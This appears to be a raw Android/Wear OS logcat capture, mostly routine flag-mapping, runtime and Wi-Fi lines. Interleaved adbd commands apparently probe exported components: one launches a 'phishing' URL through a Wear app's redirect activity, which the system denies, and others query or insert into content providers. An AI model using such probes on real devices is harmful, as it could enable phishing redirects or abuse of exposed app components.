06-30 03:20:20.608 20708 20708 D AndroidRuntime: Calling main entry com.android.commands.content.Content
06-30 03:20:20.621 20708 20708 I AconfigPackage: com.android.os.statsd.flags is mapped to com.android.os.statsd
06-30 03:20:20.622 20708 20708 I AconfigPackage: com.android.uprobestats.flags is mapped to com.android.uprobestats
06-30 03:20:20.622 20708 20708 I AconfigPackage: android.uprobestats.mainline.flags is mapped to com.android.uprobestats
06-30 03:20:20.623 20708 20708 I AconfigPackage: com.android.media.extractor.flags is mapped to com.android.media
06-30 03:20:20.623 20708 20708 I AconfigPackage: com.android.media.metrics.flags is mapped to com.android.media
06-30 03:20:20.623 20708 20708 I AconfigPackage: com.android.media.mainline.flags is mapped to com.android.media
06-30 03:20:20.624 20708 20708 I AconfigPackage: com.android.adservices.flags is mapped to com.android.adservices
06-30 03:20:20.624 20708 20708 I AconfigPackage: com.android.sdksandbox.flags is mapped to com.android.adservices
06-30 03:20:20.624 20708 20708 I AconfigPackage: android.app.sdksandbox.flags is mapped to com.android.adservices
06-30 03:20:20.625 20708 20708 I AconfigPackage: com.android.npumanager is mapped to com.android.npumanager
06-30 03:20:20.626 20708 20708 I AconfigPackage: com.android.appsearch.flags is mapped to com.android.appsearch
06-30 03:20:20.627 20708 20708 I AconfigPackage: com.android.crashrecovery.flags is mapped to com.android.crashrecovery
06-30 03:20:20.628 20708 20708 I AconfigPackage: com.android.tethering.mainline.beta is mapped to com.android.tethering
06-30 03:20:20.629 20708 20708 I AconfigPackage: android.net.http is mapped to com.android.tethering
06-30 03:20:20.629 20708 20708 I AconfigPackage: com.android.tethering.readonly.flags is mapped to com.android.tethering
06-30 03:20:20.629 20708 20708 I AconfigPackage: android.net.vcn is mapped to com.android.tethering
06-30 03:20:20.629 20708 20708 I AconfigPackage: com.android.net.flags is mapped to com.android.tethering
06-30 03:20:20.629 20708 20708 I AconfigPackage: com.android.tethering.flags is mapped to com.android.tethering
06-30 03:20:20.629 20708 20708 I AconfigPackage: com.android.tethering.beta.test is mapped to com.android.tethering
06-30 03:20:20.629 20708 20708 I AconfigPackage: com.android.nearby.flags is mapped to com.android.tethering
06-30 03:20:20.629 20708 20708 I AconfigPackage: com.android.net.thread.flags is mapped to com.android.tethering
06-30 03:20:20.629 20708 20708 I AconfigPackage: com.android.net.ct.flags is mapped to com.android.tethering
06-30 03:20:20.630 20708 20708 I AconfigPackage: com.android.nfc.module.flags is mapped to com.android.nfcservices
06-30 03:20:20.631 20708 20708 I AconfigPackage: com.android.nfc.module.nonexported.flags is mapped to com.android.nfcservices
06-30 03:20:20.631 20708 20708 I AconfigPackage: com.android.uwb.flags is mapped to com.android.uwb
06-30 03:20:20.632 20708 20708 I AconfigPackage: com.android.ranging.flags is mapped to com.android.uwb
06-30 03:20:20.633 20708 20708 I AconfigPackage: com.android.rkpd.flags is mapped to com.android.rkpd
06-30 03:20:20.634 20708 20708 I AconfigPackage: com.android.system.virtualmachine.flags is mapped to com.android.virt
06-30 03:20:20.635 20708 20708 I AconfigPackage: com.android.org.conscrypt.flags is mapped to com.android.conscrypt
06-30 03:20:20.635 20708 20708 I AconfigPackage: com.android.org.conscrypt.net.flags is mapped to com.android.conscrypt
06-30 03:20:20.636 20708 20708 I AconfigPackage: android.media.swcodec.flags is mapped to com.android.media.swcodec
06-30 03:20:20.636 20708 20708 I AconfigPackage: com.android.ipsec.flags is mapped to com.android.ipsec
06-30 03:20:20.637 20708 20708 I AconfigPackage: com.android.cellbroadcastreceiver.flags is mapped to com.android.cellbroadcast
06-30 03:20:20.638 20708 20708 I AconfigPackage: android.telecom.flags is mapped to com.android.telephonycore
06-30 03:20:20.638 20708 20708 I AconfigPackage: com.android.internal.telecom.flags is mapped to com.android.telephonycore
06-30 03:20:20.638 20708 20708 I AconfigPackage: com.android.telephony.flags is mapped to com.android.telephonycore
06-30 03:20:20.638 20708 20708 I AconfigPackage: com.android.devicelock.flags is mapped to com.android.devicelock
06-30 03:20:20.639 20708 20708 I AconfigPackage: com.android.permission.flags is mapped to com.android.permission
06-30 03:20:20.639 20708 20708 I AconfigPackage: com.android.permissioncontroller.flags is mapped to com.android.permission
06-30 03:20:20.639 20708 20708 I AconfigPackage: com.android.icu is mapped to com.android.i18n
06-30 03:20:20.640 20708 20708 I AconfigPackage: com.android.adservices.ondevicepersonalization.flags is mapped to com.android.ondevicepersonalization
06-30 03:20:20.641 20708 20708 I AconfigPackage: com.android.wifi.flags is mapped to com.android.wifi
06-30 03:20:20.642 20708 20708 I AconfigPackage: com.android.webapp.flags is mapped to com.android.webapp
06-30 03:20:20.643 20708 20708 I AconfigPackage: android.os.profiling is mapped to com.android.profiling
06-30 03:20:20.643 20708 20708 I AconfigPackage: android.os.profiling.anomaly.flags is mapped to com.android.profiling
06-30 03:20:20.645 20708 20708 I AconfigPackage: com.android.healthfitness.flags is mapped to com.android.healthfitness
06-30 03:20:20.646 20708 20708 I AconfigPackage: com.android.art.flags is mapped to com.android.art
06-30 03:20:20.646 20708 20708 I AconfigPackage: com.android.art.rw.flags is mapped to com.android.art
06-30 03:20:20.646 20708 20708 I AconfigPackage: com.android.libcore is mapped to com.android.art
06-30 03:20:20.647 20708 20708 I AconfigPackage: android.provider.flags is mapped to com.android.configinfrastructure
06-30 03:20:20.647 20708 20708 I AconfigPackage: com.android.server.deviceconfig is mapped to com.android.configinfrastructure
06-30 03:20:20.648 20708 20708 I AconfigPackage: com.google.android.widevine.flags is mapped to com.google.android.widevine
06-30 03:20:20.650 20708 20708 I AconfigPackage: com.android.adbd.flags is mapped to com.android.adbd
06-30 03:20:20.651 20708 20708 I AconfigPackage: android.graphics.pdf.flags is mapped to com.android.mediaprovider
06-30 03:20:20.651 20708 20708 I AconfigPackage: com.android.providers.media.flags is mapped to com.android.mediaprovider
06-30 03:20:20.651 20708 20708 I AconfigPackage: android.graphics.pdf.flags.readonly is mapped to com.android.mediaprovider
06-30 03:20:20.652 20708 20708 I AconfigPackage: com.android.bluetooth.beta.flags is mapped to com.android.bt
06-30 03:20:20.652 20708 20708 I AconfigPackage: com.android.bluetooth.flags is mapped to com.android.bt
06-30 03:20:20.652 20708 20708 E FeatureFlagsImplExport: android.os.flagging.AconfigStorageReadException: ERROR_PACKAGE_NOT_FOUND: package android.xr cannot be found on the device
06-30 03:20:20.661 20708 20708 D AndroidRuntime: Shutting down VM
06-30 03:20:20.661 20708 20718 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:20:20.661 20708 20717 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:20:21.556  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:am start -a android.intent.action.VIEW -d https://accounts.google.com/phishing -n com.google.android.wearable.app/com.google.android.clockwork.wcs.remoteintent.UriRedirectActivity'
06-30 03:20:21.645  1719  2465 W ActivityTaskManager: Permission Denial: starting Intent { act=android.intent.action.VIEW dat=https://accounts.google.com/... flg=0x10000000 xflg=0x4 cmp=com.google.android.wearable.app/com.google.android.clockwork.wcs.remoteintent.UriRedirectActivity } from null (pid=20721, uid=2000) requires com.google.android.wearable.permission.URI_REDIRECT_TO_REMOTE
06-30 03:20:21.645  1719  2465 V ActivityTaskManager: TaskLaunchParamsModifier: phase=0 task=null activity=null display-area-from-current-params=null display-area-from-default-fallback=DefaultTaskDisplayArea@89885625 display-id=0 task-display-area-windowing-mode=1 suggested-display-area=DefaultTaskDisplayArea@89885625
06-30 03:20:21.645  1719  2465 I ActivityTaskManager: START u0 {act=android.intent.action.VIEW dat=https://accounts.google.com/... flg=0x10000000 xflg=0x4 cmp=com.google.android.wearable.app/com.google.android.clockwork.wcs.remoteintent.UriRedirectActivity} with LAUNCH_MULTIPLE from uid 2000 (com.android.shell) result code=0
06-30 03:20:22.922  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:20:22.923  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:20:22.926  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:22.928  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:20:22.928  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:20:22.929  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:20:22.930  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:20:22.932  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:20:22.934  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:22.934  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:23.260  2257  2261 W oid.grilservice: Reducing the number of considered missed Gc histogram windows from 134 to 100
06-30 03:20:24.441   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:20:24.447  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:20:24.456  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:20:25.961  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:29.004  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:31.756   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:20:32.046  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:20:32.047  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:20:32.049  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:32.057  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:20:32.061  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:32.061  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:32.062  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:20:32.063  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:20:32.064  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:20:32.065  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:20:35.114  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:35.218  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color:export ANDROID_LOG_TAGS=''; exec logcat '-d' '-t' '60''
06-30 03:20:35.310  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:settings get global low_power'
06-30 03:20:35.515  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:cmd power set-mode 1'
06-30 03:20:35.598  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:settings get global low_power'
06-30 03:20:35.694  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:cmd power set-mode 0'
06-30 03:20:35.777  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:content query --uri content://com.google.wear.services.bugreportprovider'
06-30 03:20:36.202 20745 20745 D AndroidRuntime: >>>>>> START com.android.internal.os.RuntimeInit uid 2000 <<<<<<
06-30 03:20:36.221 20745 20745 I AndroidRuntime: Using default boot image
06-30 03:20:36.221 20745 20745 I AndroidRuntime: Leaving lock profiling enabled
06-30 03:20:36.236 20745 20745 I app_process: Core platform API enforcement enabled from the hiddenapi_platform_enforcement flag and the device API level
06-30 03:20:36.239 20745 20745 I app_process: Using generational CollectorTypeCMC GC.
06-30 03:20:36.465 20745 20745 W app_process: Bump pointer space is not aligned to 2048KB. This can lead to longer stop-the-world pauses for compaction
06-30 03:20:36.518 20745 20745 D nativeloader: InitDefaultPublicLibraries for_preload=1: libandroid.so:libaaudio.so:libamidi.so:libbinder_ndk.so:libc.so:libcamera2ndk.so:libdl.so:libEGL.so:libGLESv1_CM.so:libGLESv2.so:libGLESv3.so:libicu.so:libicui18n.so:libicuuc.so:libjnigraphics.so:liblog.so:libmediandk.so:libm.so:libnativehelper.so:libnativewindow.so:libneuralnetworks.so:libOpenMAXAL.so:libOpenSLES.so:libRS.so:libstdc++.so:libsync.so:libvulkan.so:libz.so
06-30 03:20:36.562 20745 20745 D nativeloader: Load libicu_jni.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:36.563 20745 20745 D app_process: u_setTimeZoneFilesDirectory("/apex/com.android.tzdata/etc/tz/versioned/10/icu") succeeded. 
06-30 03:20:36.563 20745 20745 D app_process: I18n APEX ICU file found: /apex/com.android.i18n/etc/icu/icudt78l.dat
06-30 03:20:36.565 20745 20745 D nativeloader: Load libjavacore.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:36.569 20745 20745 D nativeloader: Load libopenjdk.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:36.573 20745 20745 I app_process: Priority-to-niceness mapping: 19, 16, 13, 10, 0, -2, -4, -5, -6, -8
06-30 03:20:36.691 20745 20745 D nativeloader: Load libframework-connectivity-tiramisu-jni.so using APEX ns com_android_tethering for caller /apex/com.android.tethering/javalib/framework-connectivity-t.jar: ok
06-30 03:20:36.692 20745 20745 D AndroidRuntime: Calling main entry com.android.commands.content.Content
06-30 03:20:36.703 20745 20745 I AconfigPackage: com.android.os.statsd.flags is mapped to com.android.os.statsd
06-30 03:20:36.705 20745 20745 I AconfigPackage: com.android.uprobestats.flags is mapped to com.android.uprobestats
06-30 03:20:36.705 20745 20745 I AconfigPackage: android.uprobestats.mainline.flags is mapped to com.android.uprobestats
06-30 03:20:36.706 20745 20745 I AconfigPackage: com.android.media.extractor.flags is mapped to com.android.media
06-30 03:20:36.706 20745 20745 I AconfigPackage: com.android.media.metrics.flags is mapped to com.android.media
06-30 03:20:36.706 20745 20745 I AconfigPackage: com.android.media.mainline.flags is mapped to com.android.media
06-30 03:20:36.707 20745 20745 I AconfigPackage: com.android.adservices.flags is mapped to com.android.adservices
06-30 03:20:36.707 20745 20745 I AconfigPackage: com.android.sdksandbox.flags is mapped to com.android.adservices
06-30 03:20:36.707 20745 20745 I AconfigPackage: android.app.sdksandbox.flags is mapped to com.android.adservices
06-30 03:20:36.708 20745 20745 I AconfigPackage: com.android.npumanager is mapped to com.android.npumanager
06-30 03:20:36.709 20745 20745 I AconfigPackage: com.android.appsearch.flags is mapped to com.android.appsearch
06-30 03:20:36.710 20745 20745 I AconfigPackage: com.android.crashrecovery.flags is mapped to com.android.crashrecovery
06-30 03:20:36.711 20745 20745 I AconfigPackage: com.android.tethering.mainline.beta is mapped to com.android.tethering
06-30 03:20:36.711 20745 20745 I AconfigPackage: android.net.http is mapped to com.android.tethering
06-30 03:20:36.711 20745 20745 I AconfigPackage: com.android.tethering.readonly.flags is mapped to com.android.tethering
06-30 03:20:36.711 20745 20745 I AconfigPackage: android.net.vcn is mapped to com.android.tethering
06-30 03:20:36.711 20745 20745 I AconfigPackage: com.android.net.flags is mapped to com.android.tethering
06-30 03:20:36.711 20745 20745 I AconfigPackage: com.android.tethering.flags is mapped to com.android.tethering
06-30 03:20:36.711 20745 20745 I AconfigPackage: com.android.tethering.beta.test is mapped to com.android.tethering
06-30 03:20:36.711 20745 20745 I AconfigPackage: com.android.nearby.flags is mapped to com.android.tethering
06-30 03:20:36.711 20745 20745 I AconfigPackage: com.android.net.thread.flags is mapped to com.android.tethering
06-30 03:20:36.711 20745 20745 I AconfigPackage: com.android.net.ct.flags is mapped to com.android.tethering
06-30 03:20:36.712 20745 20745 I AconfigPackage: com.android.nfc.module.flags is mapped to com.android.nfcservices
06-30 03:20:36.712 20745 20745 I AconfigPackage: com.android.nfc.module.nonexported.flags is mapped to com.android.nfcservices
06-30 03:20:36.713 20745 20745 I AconfigPackage: com.android.uwb.flags is mapped to com.android.uwb
06-30 03:20:36.713 20745 20745 I AconfigPackage: com.android.ranging.flags is mapped to com.android.uwb
06-30 03:20:36.714 20745 20745 I AconfigPackage: com.android.rkpd.flags is mapped to com.android.rkpd
06-30 03:20:36.715 20745 20745 I AconfigPackage: com.android.system.virtualmachine.flags is mapped to com.android.virt
06-30 03:20:36.716 20745 20745 I AconfigPackage: com.android.org.conscrypt.flags is mapped to com.android.conscrypt
06-30 03:20:36.716 20745 20745 I AconfigPackage: com.android.org.conscrypt.net.flags is mapped to com.android.conscrypt
06-30 03:20:36.717 20745 20745 I AconfigPackage: android.media.swcodec.flags is mapped to com.android.media.swcodec
06-30 03:20:36.718 20745 20745 I AconfigPackage: com.android.ipsec.flags is mapped to com.android.ipsec
06-30 03:20:36.718 20745 20745 I AconfigPackage: com.android.cellbroadcastreceiver.flags is mapped to com.android.cellbroadcast
06-30 03:20:36.719 20745 20745 I AconfigPackage: android.telecom.flags is mapped to com.android.telephonycore
06-30 03:20:36.719 20745 20745 I AconfigPackage: com.android.internal.telecom.flags is mapped to com.android.telephonycore
06-30 03:20:36.719 20745 20745 I AconfigPackage: com.android.telephony.flags is mapped to com.android.telephonycore
06-30 03:20:36.719 20745 20745 I AconfigPackage: com.android.devicelock.flags is mapped to com.android.devicelock
06-30 03:20:36.720 20745 20745 I AconfigPackage: com.android.permission.flags is mapped to com.android.permission
06-30 03:20:36.720 20745 20745 I AconfigPackage: com.android.permissioncontroller.flags is mapped to com.android.permission
06-30 03:20:36.721 20745 20745 I AconfigPackage: com.android.icu is mapped to com.android.i18n
06-30 03:20:36.722 20745 20745 I AconfigPackage: com.android.adservices.ondevicepersonalization.flags is mapped to com.android.ondevicepersonalization
06-30 03:20:36.723 20745 20745 I AconfigPackage: com.android.wifi.flags is mapped to com.android.wifi
06-30 03:20:36.724 20745 20745 I AconfigPackage: com.android.webapp.flags is mapped to com.android.webapp
06-30 03:20:36.725 20745 20745 I AconfigPackage: android.os.profiling is mapped to com.android.profiling
06-30 03:20:36.725 20745 20745 I AconfigPackage: android.os.profiling.anomaly.flags is mapped to com.android.profiling
06-30 03:20:36.726 20745 20745 I AconfigPackage: com.android.healthfitness.flags is mapped to com.android.healthfitness
06-30 03:20:36.727 20745 20745 I AconfigPackage: com.android.art.flags is mapped to com.android.art
06-30 03:20:36.727 20745 20745 I AconfigPackage: com.android.art.rw.flags is mapped to com.android.art
06-30 03:20:36.727 20745 20745 I AconfigPackage: com.android.libcore is mapped to com.android.art
06-30 03:20:36.728 20745 20745 I AconfigPackage: android.provider.flags is mapped to com.android.configinfrastructure
06-30 03:20:36.728 20745 20745 I AconfigPackage: com.android.server.deviceconfig is mapped to com.android.configinfrastructure
06-30 03:20:36.729 20745 20745 I AconfigPackage: com.google.android.widevine.flags is mapped to com.google.android.widevine
06-30 03:20:36.730 20745 20745 I AconfigPackage: com.android.adbd.flags is mapped to com.android.adbd
06-30 03:20:36.732 20745 20745 I AconfigPackage: android.graphics.pdf.flags is mapped to com.android.mediaprovider
06-30 03:20:36.732 20745 20745 I AconfigPackage: com.android.providers.media.flags is mapped to com.android.mediaprovider
06-30 03:20:36.732 20745 20745 I AconfigPackage: android.graphics.pdf.flags.readonly is mapped to com.android.mediaprovider
06-30 03:20:36.733 20745 20745 I AconfigPackage: com.android.bluetooth.beta.flags is mapped to com.android.bt
06-30 03:20:36.733 20745 20745 I AconfigPackage: com.android.bluetooth.flags is mapped to com.android.bt
06-30 03:20:36.733 20745 20745 E FeatureFlagsImplExport: android.os.flagging.AconfigStorageReadException: ERROR_PACKAGE_NOT_FOUND: package android.xr cannot be found on the device
06-30 03:20:36.755  2109  3527 E DatabaseUtils: Writing exception to parcel
06-30 03:20:36.755  2109  3527 E DatabaseUtils: java.lang.UnsupportedOperationException
06-30 03:20:36.755  2109  3527 E DatabaseUtils: 	at com.google.wear.services.bugreport.BugreportContentProvider.query(go/retraceme 70d7290c06ecd7036d4c88cd79b0822e07343b7251d29d9eb53cf044b5e160a8:2)
06-30 03:20:36.755  2109  3527 E DatabaseUtils: 	at android.content.ContentProvider.query(ContentProvider.java:1670)
06-30 03:20:36.755  2109  3527 E DatabaseUtils: 	at android.content.ContentProvider.query(ContentProvider.java:1766)
06-30 03:20:36.755  2109  3527 E DatabaseUtils: 	at android.content.ContentProvider$Transport.query(ContentProvider.java:304)
06-30 03:20:36.755  2109  3527 E DatabaseUtils: 	at android.content.ContentProviderNative.onTransact(ContentProviderNative.java:109)
06-30 03:20:36.755  2109  3527 E DatabaseUtils: 	at android.os.Binder.execTransactInternal(Binder.java:1364)
06-30 03:20:36.755  2109  3527 E DatabaseUtils: 	at android.os.Binder.execTransact(Binder.java:1323)
06-30 03:20:36.759 20745 20755 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:20:36.759 20745 20745 D AndroidRuntime: Shutting down VM
06-30 03:20:36.760 20745 20754 W libbinder.IPCThreadState: call to talkWithDriver in joinThreadPool returned error: -9 (Bad file descriptor), FD: -1
06-30 03:20:37.662  1226  1226 I adbd    : adbd service requested 'shell,v2,TERM=xterm-256color,raw:content insert --uri content://com.google.wear.services.watchface.provider --bind test:s:value'
06-30 03:20:38.077 20756 20756 D AndroidRuntime: >>>>>> START com.android.internal.os.RuntimeInit uid 2000 <<<<<<
06-30 03:20:38.096 20756 20756 I AndroidRuntime: Using default boot image
06-30 03:20:38.096 20756 20756 I AndroidRuntime: Leaving lock profiling enabled
06-30 03:20:38.111 20756 20756 W app_process: Could not reserve sentinel fault page
06-30 03:20:38.111 20756 20756 I app_process: Core platform API enforcement enabled from the hiddenapi_platform_enforcement flag and the device API level
06-30 03:20:38.114 20756 20756 I app_process: Using generational CollectorTypeCMC GC.
06-30 03:20:38.142  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:20:38.143  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:20:38.147  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:20:38.151  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:38.152  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:20:38.157  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:20:38.158  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:20:38.158  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:20:38.161  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:20:38.161  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:20:38.354 20756 20756 W app_process: Bump pointer space is not aligned to 2048KB. This can lead to longer stop-the-world pauses for compaction
06-30 03:20:38.408 20756 20756 D nativeloader: InitDefaultPublicLibraries for_preload=1: libandroid.so:libaaudio.so:libamidi.so:libbinder_ndk.so:libc.so:libcamera2ndk.so:libdl.so:libEGL.so:libGLESv1_CM.so:libGLESv2.so:libGLESv3.so:libicu.so:libicui18n.so:libicuuc.so:libjnigraphics.so:liblog.so:libmediandk.so:libm.so:libnativehelper.so:libnativewindow.so:libneuralnetworks.so:libOpenMAXAL.so:libOpenSLES.so:libRS.so:libstdc++.so:libsync.so:libvulkan.so:libz.so
06-30 03:20:38.452 20756 20756 D nativeloader: Load libicu_jni.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:38.452 20756 20756 D app_process: u_setTimeZoneFilesDirectory("/apex/com.android.tzdata/etc/tz/versioned/10/icu") succeeded. 
06-30 03:20:38.452 20756 20756 D app_process: I18n APEX ICU file found: /apex/com.android.i18n/etc/icu/icudt78l.dat
06-30 03:20:38.455 20756 20756 D nativeloader: Load libjavacore.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:38.459 20756 20756 D nativeloader: Load libopenjdk.so using APEX ns com_android_art for caller /apex/com.android.art/javalib/core-oj.jar: ok
06-30 03:20:38.463 20756 20756 I app_process: Priority-to-niceness mapping: 19, 16, 13, 10, 0, -2, -4, -5, -6, -8
06-30 03:20:38.475 20756 20763 W app_process: Monitor::Inflate: Install failed 0x70d62528
06-30 03:20:38.578 20756 20756 D nativeloader: Load libframework-connectivity-tiramisu-jni.so using APEX ns com_android_tethering for caller /apex/com.android.tethering/javalib/framework-connectivity-t.jar: ok
06-30 03:20:38.579 20756 20756 D AndroidRuntime: Calling main entry com.android.commands.content.Content
06-30 03:20:38.584  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.02625/25000.0, IsHighLux: false
06-30 03:20:38.593 20756 20756 I AconfigPackage: com.android.os.statsd.flags is mapped to com.android.os.statsd
06-30 03:20:38.594  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.042999584/25000.0, IsHighLux: false
06-30 03:20:38.594 20756 20756 I AconfigPackage: com.android.uprobestats.flags is mapped to com.android.uprobestats
06-30 03:20:38.595 20756 20756 I AconfigPackage: android.uprobestats.mainline.flags is mapped to com.android.uprobestats
06-30 03:20:38.595 20756 20756 I AconfigPackage: com.android.media.extractor.flags is mapped to com.android.media
06-30 03:20:38.596 20756 20756 I AconfigPackage: com.android.media.metrics.flags is mapped to com.android.media
06-30 03:20:38.596 20756 20756 I AconfigPackage: com.android.media.mainline.flags is mapped to com.android.media
06-30 03:20:38.596 20756 20756 I AconfigPackage: com.android.adservices.flags is mapped to com.android.adservices
06-30 03:20:38.597 20756 20756 I AconfigPackage: com.android.sdksandbox.flags is mapped to com.android.adservices
06-30 03:20:38.597 20756 20756 I AconfigPackage: android.app.sdksandbox.flags is mapped to com.android.adservices
06-30 03:20:38.597 20756 20756 I AconfigPackage: com.android.npumanager is mapped to com.android.npumanager
06-30 03:20:38.598 20756 20756 I AconfigPackage: com.android.appsearch.flags is mapped to com.android.appsearch
06-30 03:20:38.599 20756 20756 I AconfigPackage: com.android.crashrecovery.flags is mapped to com.android.crashrecovery
06-30 03:20:38.600 20756 20756 I AconfigPackage: com.android.tethering.mainline.beta is mapped to com.android.tethering
06-30 03:20:38.600 20756 20756 I AconfigPackage: android.net.http is mapped to com.android.tethering
06-30 03:20:38.600 20756 20756 I AconfigPackage: com.android.tethering.readonly.flags is mapped to com.android.tethering
06-30 03:20:38.600 20756 20756 I AconfigPackage: android.net.vcn is mapped to com.android.tethering
06-30 03:20:38.600 20756 20756 I AconfigPackage: com.android.net.flags is mapped to com.android.tethering
06-30 03:20:38.600 20756 20756 I AconfigPackage: com.android.tethering.flags is mapped to com.android.tethering
06-30 03:20:38.600 20756 20756 I AconfigPackage: com.android.tethering.beta.test is mapped to com.android.tethering
06-30 03:20:38.600 20756 20756 I AconfigPackage: com.android.nearby.flags is mapped to com.android.tethering
06-30 03:20:38.600 20756 20756 I AconfigPackage: com.android.net.thread.flags is mapped to com.android.tethering
06-30 03:20:38.600 20756 20756 I AconfigPackage: com.android.net.ct.flags is mapped to com.android.tethering
06-30 03:20:38.601 20756 20756 I AconfigPackage: com.android.nfc.module.flags is mapped to com.android.nfcservices
06-30 03:20:38.601 20756 20756 I AconfigPackage: com.android.nfc.module.nonexported.flags is mapped to com.android.nfcservices
06-30 03:20:38.602 20756 20756 I AconfigPackage: com.android.uwb.flags is mapped to com.android.uwb
06-30 03:20:38.602 20756 20756 I AconfigPackage: com.android.ranging.flags is mapped to com.android.uwb
06-30 03:20:38.603 20756 20756 I AconfigPackage: com.android.rkpd.flags is mapped to com.android.rkpd
06-30 03:20:38.604 20756 20756 I AconfigPackage: com.android.system.virtualmachine.flags is mapped to com.android.virt
06-30 03:20:38.605 20756 20756 I AconfigPackage: com.android.org.conscrypt.flags is mapped to com.android.conscrypt
06-30 03:20:38.605 20756 20756 I AconfigPackage: com.android.org.conscrypt.net.flags is mapped to com.android.conscrypt
06-30 03:20:38.606 20756 20756 I AconfigPackage: android.media.swcodec.flags is mapped to com.android.media.swcodec
06-30 03:20:38.606 20756 20756 I AconfigPackage: com.android.ipsec.flags is mapped to com.android.ipsec
06-30 03:20:38.607 20756 20756 I AconfigPackage: com.android.cellbroadcastreceiver.flags is mapped to com.android.cellbroadcast
06-30 03:20:38.608 20756 20756 I AconfigPackage: android.telecom.flags is mapped to com.android.telephonycore
06-30 03:20:38.609 20756 20756 I AconfigPackage: com.android.internal.telecom.flags is mapped to com.android.telephonycore
06-30 03:20:38.609 20756 20756 I AconfigPackage: com.android.telephony.flags is mapped to com.android.telephonycore
06-30 03:20:38.609 20756 20756 I AconfigPackage: com.android.devicelock.flags is mapped to com.android.devicelock
06-30 03:20:38.610 20756 20756 I AconfigPackage: com.android.permission.flags is mapped to com.android.permission
06-30 03:20:38.610 20756 20756 I AconfigPackage: com.android.permissioncontroller.flags is mapped to com.android.permission
06-30 03:20:38.610 20756 20756 I AconfigPackage: com.android.icu is mapped to com.android.i18n
06-30 03:20:38.611 20756 20756 I AconfigPackage: com.android.adservices.ondevicepersonalization.flags is mapped to com.android.ondevicepersonalization
06-30 03:20:38.612 20756 20756 I AconfigPackage: com.android.wifi.flags is mapped to com.android.wifi
06-30 03:20:38.612 20756 20756 I AconfigPackage: com.android.webapp.flags is mapped to com.android.webapp
06-30 03:20:38.613 20756 20756 I AconfigPackage: android.os.profiling is mapped to com.android.profiling
